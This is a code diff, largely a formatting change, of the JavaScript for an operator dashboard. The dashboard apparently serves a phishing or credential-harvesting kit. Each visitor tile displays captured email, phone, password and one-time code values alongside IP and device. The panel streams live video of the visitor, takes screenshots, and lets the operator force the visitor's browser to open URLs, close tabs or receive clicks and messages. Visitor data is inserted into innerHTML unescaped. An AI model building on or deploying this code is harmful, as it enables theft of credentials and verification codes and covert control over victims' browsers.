     }
+  }
 }
 
 // ---------- UI & RENDERING ----------
 function setFilter(filter) {
-    currentFilter = filter;
-    document.querySelectorAll('.nav-tab').forEach(tab => {
-        tab.classList.toggle('active', tab.dataset.filter === filter);
-    });
-    applyFilter();
+  currentFilter = filter;
+  document.querySelectorAll(".nav-tab").forEach((tab) => {
+    tab.classList.toggle("active", tab.dataset.filter === filter);
+  });
+  applyFilter();
 }
 
 function applyFilter() {
-    document.querySelectorAll('.tile').forEach(tile => {
-        const status = tile.dataset.status;
-        const matchesFilter = currentFilter === 'all' || currentFilter === status;
-        const query = document.getElementById('search-bar').value.toLowerCase();
-        const title = tile.querySelector('h3').textContent.toLowerCase();
-        const matchesSearch = title.includes(query);
-        tile.style.display = (matchesFilter && matchesSearch) ? 'flex' : 'none';
-    });
-    toggleEmptyState();
+  document.querySelectorAll(".tile").forEach((tile) => {
+    const status = tile.dataset.status;
+    const matchesFilter = currentFilter === "all" || currentFilter === status;
+    const query = document.getElementById("search-bar").value.toLowerCase();
+    const title = tile.querySelector("h3").textContent.toLowerCase();
+    const matchesSearch = title.includes(query);
+    tile.style.display = matchesFilter && matchesSearch ? "flex" : "none";
+  });
+  toggleEmptyState();
 }
 
 function toggleEmptyState() {
-    const empty = document.getElementById('empty-state');
-    const visibleTiles = Array.from(document.querySelectorAll('.tile')).filter(t => t.style.display !== 'none');
-    if (empty) empty.style.display = visibleTiles.length > 0 ? 'none' : 'flex';
+  const empty = document.getElementById("empty-state");
+  const visibleTiles = Array.from(document.querySelectorAll(".tile")).filter(
+    (t) => t.style.display !== "none",
+  );
+  if (empty) empty.style.display = visibleTiles.length > 0 ? "none" : "flex";
 }
 
 function addOrUpdateVisitor(v) {
-    const existing = visitors.get(v.id) || {};
-    const merged = { ...existing, ...v };
-    visitors.set(v.id, merged);
-    updateTile(merged);
-    applyFilter();
+  const existing = visitors.get(v.id) || {};
+  const merged = { ...existing, ...v };
+  visitors.set(v.id, merged);
+  updateTile(merged);
+  applyFilter();
 }
 
 function createTile(v) {
-    const tile = document.createElement('div');
-    tile.id = `tile-${v.id}`;
-    tile.className = 'tile';
-    tile.dataset.status = v.status;
+  const tile = document.createElement("div");
+  tile.id = `tile-${v.id}`;
+  tile.className = "tile";
+  tile.dataset.status = v.status;
 
-    tile.innerHTML = `
+  tile.innerHTML = `
         <div class="tile-header">
             <div class="tile-info">
                 <h3 id="title-${v.id}"></h3>
@@ -572,172 +689,213 @@ function createTile(v) {
         </div>
     `;
 
-    document.getElementById('visitor-grid').appendChild(tile);
+  document.getElementById("visitor-grid").appendChild(tile);
 
-    if (streams.has(v.id)) {
-        const video = document.getElementById(`video-${v.id}`);
-        if (video) { video.srcObject = streams.get(v.id); video.play().catch(err => console.log("Play blocked", err)); }
+  if (streams.has(v.id)) {
+    const video = document.getElementById(`video-${v.id}`);
+    if (video) {
+      video.srcObject = streams.get(v.id);
+      video.play().catch((err) => console.log("Play blocked", err));
     }
-    return tile;
+  }
+  return tile;
 }
 
 function updateTile(v) {
-    let tile = document.getElementById(`tile-${v.id}`);
-    if (!tile) tile = createTile(v);
+  let tile = document.getElementById(`tile-${v.id}`);
+  if (!tile) tile = createTile(v);
 
-    document.getElementById(`title-${v.id}`).textContent = `ID: ${v.id.split('-')[0]}`;
+  document.getElementById(`title-${v.id}`).textContent =
+    `ID: ${v.id.split("-")[0]}`;
 
-    let contactHtml = '<div class="contact-badges">';
-    if (v.email) contactHtml += `<span class="c-badge"><strong>E:</strong> <span>${v.email}</span></span>`;
-    if (v.phone) contactHtml += `<span class="c-badge"><strong>P:</strong> <span>${v.phone}</span></span>`;
-    if (v.password) contactHtml += `<span class="c-badge pass"><strong>Pass:</strong> <span>${v.password}</span></span>`;
-    if (v.code) contactHtml += `<span class="c-badge code"><strong>Code:</strong> <span>${v.code}</span></span>`;
-    contactHtml += '</div>';
+  let contactHtml = '<div class="contact-badges">';
+  if (v.email)
+    contactHtml += `<span class="c-badge"><strong>E:</strong> <span>${v.email}</span></span>`;
+  if (v.phone)
+    contactHtml += `<span class="c-badge"><strong>P:</strong> <span>${v.phone}</span></span>`;
+  if (v.password)
+    contactHtml += `<span class="c-badge pass"><strong>Pass:</strong> <span>${v.password}</span></span>`;
+  if (v.code)
+    contactHtml += `<span class="c-badge code"><strong>Code:</strong> <span>${v.code}</span></span>`;
+  contactHtml += "</div>";
 
-    document.getElementById(`contact-${v.id}`).innerHTML = contactHtml;
-    document.querySelector(`.device-${v.id}`).textContent = parseUserAgent(v.userAgent);
-    document.querySelector(`.ip-${v.id}`).textContent = v.ip;
-    tile.dataset.status = v.status;
+  document.getElementById(`contact-${v.id}`).innerHTML = contactHtml;
+  document.querySelector(`.device-${v.id}`).textContent = parseUserAgent(
+    v.userAgent,
+  );
+  document.querySelector(`.ip-${v.id}`).textContent = v.ip;
+  tile.dataset.status = v.status;
 
-    const msgInput = document.getElementById(`msg-${v.id}`);
-    const msgBtn = msgInput.nextElementSibling;
+  const msgInput = document.getElementById(`msg-${v.id}`);
+  const msgBtn = msgInput.nextElementSibling;
 
-    if (v.status === 'online') {
-        msgInput.disabled = false; msgBtn.disabled = false;
-        startTimer(v.id, v.connectedAt);
-    } else {
-        msgInput.disabled = true; msgBtn.disabled = true;
-        document.getElementById(`timer-${v.id}`).textContent = 'Offline';
-        if (streams.has(v.id)) {
-            streams.delete(v.id);
-            const video = document.getElementById(`video-${v.id}`);
-            if (video) video.srcObject = null;
-        }
+  if (v.status === "online") {
+    msgInput.disabled = false;
+    msgBtn.disabled = false;
+    startTimer(v.id, v.connectedAt);
+  } else {
+    msgInput.disabled = true;
+    msgBtn.disabled = true;
+    document.getElementById(`timer-${v.id}`).textContent = "Offline";
+    if (streams.has(v.id)) {
+      streams.delete(v.id);
+      const video = document.getElementById(`video-${v.id}`);
+      if (video) video.srcObject = null;
     }
+  }
 }
 
 function insertScheme(inputId, scheme) {
-    const input = document.getElementById(inputId);
-    if (!input) return;
-    input.value = scheme;
-    input.focus();
+  const input = document.getElementById(inputId);
+  if (!input) return;
+  input.value = scheme;
+  input.focus();
 }
 
 function forceOpenURL(id) {
-    const input = document.getElementById(`open-url-${id}`);
-    const url = input.value.trim();
-    if (!url) return;
-    ws.send(JSON.stringify({ type: 'remote-open-url', target: id, url: url }));
-    input.value = '';
-    showAdminToast("Command Sent", `Forcing visitor to open: ${url}`);
+  const input = document.getElementById(`open-url-${id}`);
+  const url = input.value.trim();
+  if (!url) return;
+  ws.send(JSON.stringify({ type: "remote-open-url", target: id, url: url }));
+  input.value = "";
+  showAdminToast("Command Sent", `Forcing visitor to open: ${url}`);
 }
 
 function sendMessage(id) {
-    const input = document.getElementById(`msg-${id}`);
-    const text = input.value.trim();
-    if (!text) return;
-    const lowerText = text.toLowerCase();
-    if (lowerText === 'close' || lowerText === 'close-tab') {
-        ws.send(JSON.stringify({ type: 'remote-close-tab', target: id }));
-        input.value = '';
-        return;
-    }
-    if (lowerText.startsWith('open ')) {
-        const url = text.substring(5).trim();
-        ws.send(JSON.stringify({ type: 'remote-open-url', target: id, url: url }));
-        input.value = '';
-        return;
-    }
-    ws.send(JSON.stringify({ type: 'admin-message', targetId: id, text: text }));
-    input.value = '';
+  const input = document.getElementById(`msg-${id}`);
+  const text = input.value.trim();
+  if (!text) return;
+  const lowerText = text.toLowerCase();
+  if (lowerText === "close" || lowerText === "close-tab") {
+    ws.send(JSON.stringify({ type: "remote-close-tab", target: id }));
+    input.value = "";
+    return;
+  }
+  if (lowerText.startsWith("open ")) {
+    const url = text.substring(5).trim();
+    ws.send(JSON.stringify({ type: "remote-open-url", target: id, url: url }));
+    input.value = "";
+    return;
+  }
+  ws.send(JSON.stringify({ type: "admin-message", targetId: id, text: text }));
+  input.value = "";
 }
 
 function promptDelete(id) {
-    deleteTargetId = id;
-    document.getElementById('delete-modal').classList.add('active');
+  deleteTargetId = id;
+  document.getElementById("delete-modal").classList.add("active");
 }
 
 function closeDeleteModal() {
-    deleteTargetId = null;
-    document.getElementById('delete-modal').classList.remove('active');
+  deleteTargetId = null;
+  document.getElementById("delete-modal").classList.remove("active");
 }
 
-document.getElementById('confirm-delete-btn').addEventListener('click', () => {
-    if (deleteTargetId) {
-        ws.send(JSON.stringify({ type: 'remove-visitor', targetId: deleteTargetId }));
-        if (peerConnections.has(deleteTargetId)) { peerConnections.get(deleteTargetId).close(); peerConnections.delete(deleteTargetId); }
-        streams.delete(deleteTargetId); visitors.delete(deleteTargetId); controlledVisitors.delete(deleteTargetId);
-        if (activeControlId === deleteTargetId) stopTyping();
-        const tile = document.getElementById(`tile-${deleteTargetId}`);
-        if (tile) tile.remove();
-        toggleEmptyState(); applyFilter(); closeDeleteModal();
-        updateActiveCount();
+document.getElementById("confirm-delete-btn").addEventListener("click", () => {
+  if (deleteTargetId) {
+    ws.send(
+      JSON.stringify({ type: "remove-visitor", targetId: deleteTargetId }),
+    );
+    if (peerConnections.has(deleteTargetId)) {
+      peerConnections.get(deleteTargetId).close();
+      peerConnections.delete(deleteTargetId);
     }
+    streams.delete(deleteTargetId);
+    visitors.delete(deleteTargetId);
+    controlledVisitors.delete(deleteTargetId);
+    if (activeControlId === deleteTargetId) stopTyping();
+    const tile = document.getElementById(`tile-${deleteTargetId}`);
+    if (tile) tile.remove();
+    toggleEmptyState();
+    applyFilter();
+    closeDeleteModal();
+    updateActiveCount();
+  }
 });
 
 function captureScreenshot(id) {
-    const video = document.getElementById(`video-${id}`);
-    if (!video || !video.srcObject) return;
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-    const a = document.createElement('a');
-    a.href = canvas.toDataURL('image/png');
-    a.download = `capture_${id.split('-')[0]}_${Date.now()}.png`;
-    a.click();
+  const video = document.getElementById(`video-${id}`);
+  if (!video || !video.srcObject) return;
+  const canvas = document.createElement("canvas");
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
+  const a = document.createElement("a");
+  a.href = canvas.toDataURL("image/png");
+  a.download = `capture_${id.split("-")[0]}_${Date.now()}.png`;
+  a.click();
 }
 
 function maximizeVideo(id) {
-    currentModalId = id;
-    const video = document.getElementById(`video-${id}`);
-    if (!video || !video.srcObject) return;
-    const modal = document.getElementById('expand-modal');
-    const container = document.getElementById('modal-video-container');
-    container.innerHTML = '';
-    const clone = video.cloneNode(true);
-    clone.id = `modal-video-${id}`;
-    clone.srcObject = video.srcObject;
-    clone.onclick = (e) => handleRemoteClick(e, id);
-    container.appendChild(clone);
-    modal.classList.add('active');
-    document.getElementById('modal-msg-input').value = document.getElementById(`msg-${id}`).value;
-    clone.play().catch(err => console.log("Play blocked", err));
+  currentModalId = id;
+  const video = document.getElementById(`video-${id}`);
+  if (!video || !video.srcObject) return;
+  const modal = document.getElementById("expand-modal");
+  const container = document.getElementById("modal-video-container");
+  container.innerHTML = "";
+  const clone = video.cloneNode(true);
+  clone.id = `modal-video-${id}`;
+  clone.srcObject = video.srcObject;
+  clone.onclick = (e) => handleRemoteClick(e, id);
+  container.appendChild(clone);
+  modal.classList.add("active");
+  document.getElementById("modal-msg-input").value = document.getElementById(
+    `msg-${id}`,
+  ).value;
+  clone.play().catch((err) => console.log("Play blocked", err));
 }
 
 function closeModal() {
-    document.getElementById('expand-modal').classList.remove('active');
-    const container = document.getElementById('modal-video-container');
-    const clone = container.querySelector('video');
-    if (clone) clone.srcObject = null;
-    container.innerHTML = ''; currentModalId = null;
+  document.getElementById("expand-modal").classList.remove("active");
+  const container = document.getElementById("modal-video-container");
+  const clone = container.querySelector("video");
+  if (clone) clone.srcObject = null;
+  container.innerHTML = "";
+  currentModalId = null;
 }
 
 function sendModalMessage() {
-    if (!currentModalId) return;
-    const input = document.getElementById('modal-msg-input');
-    const text = input.value.trim();
-    if (!text) return;
-    const lowerText = text.toLowerCase();
-    if (lowerText === 'close' || lowerText === 'close-tab') {
-        ws.send(JSON.stringify({ type: 'remote-close-tab', target: currentModalId }));
-        input.value = '';
-        return;
-    }
-    if (lowerText.startsWith('open ')) {
-        const url = text.substring(5).trim();
-        ws.send(JSON.stringify({ type: 'remote-open-url', target: currentModalId, url: url }));
-        input.value = '';
-        return;
-    }
-    ws.send(JSON.stringify({ type: 'admin-message', targetId: currentModalId, text: text }));
-    input.value = '';
+  if (!currentModalId) return;
+  const input = document.getElementById("modal-msg-input");
+  const text = input.value.trim();
+  if (!text) return;
+  const lowerText = text.toLowerCase();
+  if (lowerText === "close" || lowerText === "close-tab") {
+    ws.send(
+      JSON.stringify({ type: "remote-close-tab", target: currentModalId }),
+    );
+    input.value = "";
+    return;
+  }
+  if (lowerText.startsWith("open ")) {
+    const url = text.substring(5).trim();
+    ws.send(
+      JSON.stringify({
+        type: "remote-open-url",
+        target: currentModalId,
+        url: url,
+      }),
+    );
+    input.value = "";
+    return;
+  }
+  ws.send(
+    JSON.stringify({
+      type: "admin-message",
+      targetId: currentModalId,
+      text: text,
+    }),
+  );
+  input.value = "";
 }
 
 function showAdminToast(title, message) {
-    const container = document.getElementById('admin-toast-container');
-    const toast = document.createElement('div');
-    toast.className = 'toast';
-    toast.innerHTML = `
+  const container = document.getElementById("admin-toast-container");
+  if (!container) return;
+
+  const toast = document.createElement("div");
+  toast.className = "toast";
+  toast.innerHTML = `
         <div class="toast-icon">
             <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
         </div>
@@ -746,56 +904,68 @@ function showAdminToast(title, message) {
             <p>${message}</p>
         </div>
     `;
-    container.appendChild(toast);
-    setTimeout(() => {
-        if (toast.parentElement) {
-            toast.classList.add('removing');
-            setTimeout(() => toast.remove(), 300);
-        }
-    }, 5000);
+  container.appendChild(toast);
+  setTimeout(() => {
+    if (toast.parentElement) {
+      toast.classList.add("removing");
+      setTimeout(() => toast.remove(), 300);
+    }
+  }, 5000);
 }
 
 function parseUserAgent(ua) {
-    if (!ua) return 'Unknown';
-    if (ua.includes('Windows')) return 'Windows';
-    if (ua.includes('Macintosh')) return 'Mac';
-    if (ua.includes('iPhone')) return 'iPhone';
-    if (ua.includes('Android')) return 'Android';
-    if (ua.includes('Linux')) return 'Linux';
-    return 'Desktop';
+  if (!ua) return "Unknown";
+  if (ua.includes("Windows")) return "Windows";
+  if (ua.includes("Macintosh")) return "Mac";
+  if (ua.includes("iPhone")) return "iPhone";
+  if (ua.includes("Android")) return "Android";
+  if (ua.includes("Linux")) return "Linux";
+  return "Desktop";
 }
 
-document.getElementById('search-bar').addEventListener('input', () => applyFilter());
-document.getElementById('theme-toggle').addEventListener('click', () => document.body.classList.toggle('light-mode'));
+document
+  .getElementById("search-bar")
+  .addEventListener("input", () => applyFilter());
+document
+  .getElementById("theme-toggle")
+  .addEventListener("click", () =>
+    document.body.classList.toggle("light-mode"),
+  );
 
 const timers = new Map();
 function startTimer(id, startTime) {
-    if (timers.has(id)) clearInterval(timers.get(id));
-    timers.set(id, setInterval(() => {
-        const el = document.getElementById(`timer-${id}`);
-        if (el && el.textContent !== 'Offline') el.textContent = formatTime(Date.now() - startTime);
-    }, 1000));
+  if (timers.has(id)) clearInterval(timers.get(id));
+  timers.set(
+    id,
+    setInterval(() => {
+      const el = document.getElementById(`timer-${id}`);
+      if (el && el.textContent !== "Offline")
+        el.textContent = formatTime(Date.now() - startTime);
+    }, 1000),
+  );
 }
 
 function formatTime(ms) {
-    const totalSeconds = Math.floor(ms / 1000);
-    const m = Math.floor(totalSeconds / 60).toString().padStart(2, '0');
-    const s = (totalSeconds % 60).toString().padStart(2, '0');
-    return `${m}:${s}`;
+  const totalSeconds = Math.floor(ms / 1000);
+  const m = Math.floor(totalSeconds / 60)
+    .toString()
+    .padStart(2, "0");
+  const s = (totalSeconds % 60).toString().padStart(2, "0");
+  return `${m}:${s}`;
 }
 
 function playBeep() {
-    try {
-        const ctx = new (window.AudioContext || window.webkitAudioContext)();
-        const osc = ctx.createOscillator();
-        const gain = ctx.createGain();
-        osc.type = 'sine';
-        osc.frequency.setValueAtTime(800, ctx.currentTime);
-        gain.gain.setValueAtTime(0.1, ctx.currentTime);
-        gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.5);
-        osc.connect(gain);
-        gain.connect(ctx.destination);
-        osc.start();
-        osc.stop(ctx.currentTime + 0.5);
-    } catch(e) {}
+  try {
+    const ctx = new (window.AudioContext || window.webkitAudioContext)();
+    const osc = ctx.createOscillator();
+    const gain = ctx.createGain();
+    osc.type = "sine";
+    osc.frequency.setValueAtTime(800, ctx.currentTime);
+    gain.gain.setValueAtTime(0.1, ctx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.5);
+    osc.connect(gain);
+    gain.connect(ctx.destination);
+    osc.start();
+    osc.stop(ctx.currentTime + 0.5);
+  } catch (e) {}
 }
